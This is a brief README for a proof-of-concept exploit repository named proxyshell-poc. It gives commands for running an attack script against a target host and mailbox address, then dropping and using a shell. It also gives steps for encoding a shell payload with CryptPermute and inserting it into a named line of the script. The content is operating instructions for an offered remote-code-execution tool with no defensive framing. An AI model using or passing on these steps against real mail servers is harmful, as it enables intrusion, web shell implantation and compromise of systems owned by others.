# proxyshell-poc

## base usage
1. `python3 proxyshell_rce.py -u ip|domain -e user@domain.com`
2. `dropshell`
3. `whoami`

## generate CryptPermute content
1. execute `CryptPermute.exe shell.txt`, generate file `poc`.
2. base64 `poc` file.
3. Replace the contents of line 314 of the `proxyshell.py` file:
```
<t:Content>base64 `poc` file string</t:Content>
```
